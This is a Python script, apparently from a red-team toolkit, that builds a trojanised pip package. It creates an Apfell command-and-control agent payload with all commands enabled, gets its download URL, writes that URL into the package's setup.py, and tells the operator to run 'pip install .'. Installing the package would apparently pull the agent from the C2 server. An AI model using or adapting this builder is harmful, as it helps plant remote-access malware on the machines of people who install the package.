import os
import asyncio
from .Utilities import *

def pip_package():
    temp = "./Templates/Python_PIP_Package/"
    payload = "./Payloads/Python_PIP_Package_Payload/"

    copyanything(temp,payload)    

    ## Create apfell payload
    async def scripting():
        payload_info = await login_and_create_apfell(description="Installer Pkg with JS Functionality",
                                                     filename="Installer_with_JavaScript.js",
                                                     include_all_commands=True)
        url = await get_payload_download_url(payload_info)
        # Replace template values
        templateString = "URL"
        modifyFile = payload + "setup.py"

        fin = open(modifyFile, "rt")
        data = fin.read()
        data = data.replace(templateString, url)
        fin.close()

        fin = open(modifyFile, "wt")
        fin.write(data)
        fin.close()

        #  Build the payload (currently no payload)
        print("[*] Building Python PIP Package")
        os.system("chmod +x " + modifyFile)
        print("[*] Done! Execute using Python 'pip install . ' within folder")

    async def main():
        await scripting()

    asyncio.run(main())
